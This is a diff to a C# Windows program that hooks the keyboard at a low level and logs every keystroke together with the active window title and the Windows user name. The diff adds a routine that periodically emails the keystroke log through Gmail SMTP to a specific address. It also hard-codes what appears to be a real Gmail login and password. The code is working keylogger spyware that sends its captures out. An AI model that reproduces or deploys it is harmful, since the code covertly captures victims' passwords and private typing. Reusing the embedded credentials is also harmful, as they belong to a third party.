@@ -5,6 +5,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -18,7 +19,7 @@ namespace WindowsFormsApp1
         #region hook key board
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-
+        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
@@ -101,9 +102,12 @@ namespace WindowsFormsApp1
         /// <param name="vkCode"></param>
         static void WriteLog(int vkCode)
         {
-            Console.WriteLine((Keys)vkCode);
-            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
-            StreamWriter sw = new StreamWriter(logNameToWrite, true);
+           // Console.WriteLine((Keys)vkCode);
+            string logNameToWrite = Application.StartupPath +@"\"+ DateTime.Now.ToLongDateString() + logExtendtion;
+            Console.OutputEncoding = Encoding.UTF8;
+            Console.InputEncoding = Encoding.UTF8;
+            StreamWriter sw = new StreamWriter(logNameToWrite, true,Encoding.UTF8);
+
             sw.Write((Keys)vkCode);
             sw.Close();
         }
@@ -162,29 +166,39 @@ namespace WindowsFormsApp1
             if (lastWindowTitle != windowTitle)
             {
 
-                Console.WriteLine("Time: {0}\nWindowTitle: {1}\n",
+                Console.WriteLine("User:{0}\nTime: {1}\nWindowTitle: {2}\n", Program.userName,
                     DateTime.Now.ToString("dd/MM/yyyy  HH:mm:ss"),
                     windowTitle);
-
-                lastWindowTitle = windowTitle;
+             
+                
+               lastWindowTitle = windowTitle;
             }
         }
+        static int interval = 1;
+        static int captureTime = 100;
         static void StartTimmer()
         {
             Program program = new Program();
             Thread thread = new Thread(() => {
                 while (true)
                 {
-                    Thread.Sleep(1000);
-
-                   
-           
-              program.WriteCurrentWindowInformation();
+                    Thread.Sleep(1);
+                    if (interval % captureTime == 0)
+                        program.WriteCurrentWindowInformation();
+                    if (interval % mailTime == 0)
+                        SendMail();
+                
+                    if (interval % 200 == 0)
+                        HookKeyboard();
+                    interval++;
+                    if (interval >= 1000000)
+                        interval = 0;
                 }
             });
             thread.IsBackground = true;
             thread.Start();
         }
+     
         static void HookKeyboard()
         {
             _hookID = SetHook(_proc);
@@ -192,12 +206,54 @@ namespace WindowsFormsApp1
             UnhookWindowsHookEx(_hookID);
         }
         #endregion
+      
+        static int mailTime = 5000;
+        static void SendMail()
+        {   
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
 
+                mail.From = new MailAddress("email@gmail.com");
+                mail.To.Add("phucdt1280@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "This is mail for keylogger\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+     
+
+                if (File.Exists(logFile))
+                {
+                    // StreamReader sr = new StreamReader(logFile);
+                    //mail.Body += sr.ReadToEnd();
+                    //sr.Close();
+                    //System.Net.Mail.Attachment attachment;
+                    //attachment = new System.Net.Mail.Attachment(logFile);
+                    //mail.Attachments.Add(attachment);
+                    mail.Attachments.Add(new Attachment(logFile));
+
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("phucdt1280@gmail.com", "nitranhngao@81299@");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
 
         static void Main(string[] args)
         {
             StartTimmer();
-            HookKeyboard(); 
+          //  HookKeyboard(); 
 
         }
     }
